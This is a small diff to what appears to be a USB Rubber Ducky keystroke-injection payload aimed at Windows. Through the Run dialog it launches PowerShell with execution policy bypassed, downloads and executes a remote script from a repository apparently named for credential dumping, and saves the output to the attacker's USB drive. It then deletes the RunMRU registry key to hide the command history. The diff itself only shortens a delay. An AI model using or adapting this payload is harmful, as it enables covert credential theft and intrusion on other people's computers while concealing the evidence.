@@ -6,7 +6,7 @@ GUI r
 DELAY 100
 STRING powershell -exec bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://github.com/secwolf6/Invoke-Mimiduck/raw/master/babayega.ps1');babayega | Out-File -Encoding utf8 -FilePath ((gwmi win32_volume -f 'label=''_''').Name+'output.txt')"
 ENTER
-DELAY 10000
+DELAY 1000
 GUI r
 DELAY 100
 STRING cmd /C REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
